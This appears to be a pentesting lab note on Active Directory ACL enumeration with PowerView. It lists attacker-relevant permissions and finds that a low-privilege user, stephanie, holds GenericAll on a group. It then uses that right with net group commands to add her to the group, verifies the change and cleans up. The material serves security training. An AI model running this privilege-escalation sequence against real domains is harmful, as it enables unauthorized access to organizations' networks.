---
description: >-
  Active Directory is a hierarchical database that contains Active Directory
  Objects. There include: users, computers, applications, printers and shared
  folders
---

# Enumerating Object Permissions



## Recap

When a user tries to access an Active Directory Object it sends it's access token, which consists of user identity and permissions. The target object then checks the access token against a list of known permissions (Access Control List). If the user is in the ACL, access is granted.

### Permissions&#x20;

Active Directory has a wealth of permissions, but from an attacker standpoint we are focused on the following:

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

## Enumerating ACE's - PowerView

_Access Control Entries_ (ACE) make up the Access Control Lists, they are themselves an Active Directory Object. We can query them with PowerView.

```powershell
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...
```

## Convert SID's - PowerView

We're interesting in: <mark style="color:orange;">ObejctSID</mark>, <mark style="color:orange;">ActiveDirectoryRights</mark>, & <mark style="color:orange;">SecurityIdentifier</mark>.&#x20;

We can use PowerView to convert this SID to plaintext:

```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```

```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```



## Converting All SID's from an Object- PowerView

Above we fetched all SID's for a user, this can be tedious. Instead let's fetch all SID's for a AD Object. We will query "<mark style="color:orange;">Management Department</mark>" with "<mark style="color:orange;">GerericAll</mark>" Permissions.

### Fetch all SID's

```powershell
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
```

### Convert All SID's

```powershell
PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```

<mark style="color:red;">NOTE:</mark> We see that <mark style="color:orange;">stephanie</mark> has "<mark style="color:orange;">GenericAll</mark>" permissions for this Object, a low-level user should not have these types of permissions so it must be a configuration mistake!

<mark style="color:green;">**GenericAll**</mark>** **_**is the most powerfull ACL in Active Directory.**_

##

## Exploiting Vulnerability

### Adding New User

Above we discovered a misconfiguration in the "Management Department" AD Object, but there's only one user that has access: Jen. We can use stephanies permissions to add herself to the Group.

```powershell
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
```

### Verify

We can verify that stephanie was indeed added with PowerView, alternatively net.exe will work.

```powershell
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```

### Cleanup

After we're done doing our business we always want to cleanup. Let's delete Stephanie from the Group.

```powershell
PS C:\Tools> net group "Management Department" stephanie /del /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
```

